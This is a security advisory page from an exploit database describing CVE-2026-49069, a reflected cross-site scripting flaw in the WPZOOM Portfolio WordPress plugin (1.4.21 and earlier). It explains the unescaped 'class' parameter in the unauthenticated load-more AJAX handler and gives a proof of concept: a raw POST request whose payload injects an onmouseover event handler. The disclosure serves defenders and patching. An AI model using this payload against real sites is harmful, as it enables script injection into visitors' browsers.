---
title: WordPress Plugin WPZOOM Portfolio 1.4.21  Reflected Cross-Site Scripting (XSS)
url: https://cxsecurity.com/issue/WLB-2026080012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-21
fetch_date: 2026-08-22T02:50:38.292351
---

# WordPress Plugin WPZOOM Portfolio 1.4.21  Reflected Cross-Site Scripting (XSS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Plugin WPZOOM Portfolio 1.4.21 Reflected Cross-Site Scripting (XSS)** **2026.08.21**  Credit:  **[Kent Apostol](https://cxsecurity.com/author/Kent%2BApostol/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-49069](https://cxsecurity.com/cveshow/CVE-2026-49069/ "Click to see CVE-2026-49069")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: WordPress Plugin WPZOOM Portfolio 1.4.21 - Reflected Cross-Site Scripting (XSS)
# Date: June 10, 2026
# Exploit Author: Kent Apostol
# Vendor Homepage: https://wpzoom.com
# Software Link: https://wordpress.org
# Version: <= 1.4.21
# Tested on: WordPress 6.x
# CVE: CVE-2026-49069
Vulnerability Description:
The WPZOOM Portfolio plugin for WordPress is vulnerable to unauthenticated reflected Cross-Site Scripting via the `wpzoom\_load\_more\_items` AJAX action. The handler is registered for unauthenticated users through `wp\_ajax\_nopriv\_wpzoom\_load\_more\_items` and performs no nonce validation or privilege checks.
The application reads the `posts\_data` POST parameter, passes it through `sanitize\_text\_field()`, and JSON-decodes it into an array which is then merged into `$args` via `wp\_parse\_args()`. The attacker-controlled `class` key from this array is assigned to `$args['class']` and concatenated directly into multiple single-quoted HTML attributes within `items\_html()` (e.g., `<li class='{$class}\_item ...'>`, `<article class='{$class}\_item-wrap ...'>`, `<h3 class='{$class}\_item-title'>`) without any context-aware output escaping like `esc\_attr()`.
Because `sanitize\_text\_field()` strips angle brackets (`<`, `>`) but preserves single quotes (`'`), an attacker can break out of the HTML attribute string and inject arbitrary attributes, including malicious JavaScript event handlers. The payload executes when the underlying query returns at least one published portfolio item.
Proof of Concept (PoC):
Step 1: As an unauthenticated user, send the following POST request to the target site:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
action=wpzoom\_load\_more\_items&offset=0&posts\_data={"source":"post","class":"x' onmouseover='alert(document.domain)' y='"}
Step 2: Review the HTTP response to verify that the single quote has successfully broken out of the class attribute structure to inject the event handler:
<li class='x' onmouseover='alert(document.domain)' y='\_item ...' data-category='1'>
Step 3: When rendered in a victim's browser, triggering the event handler (hovering over the loaded portfolio item) executes the JavaScript code.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026080012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top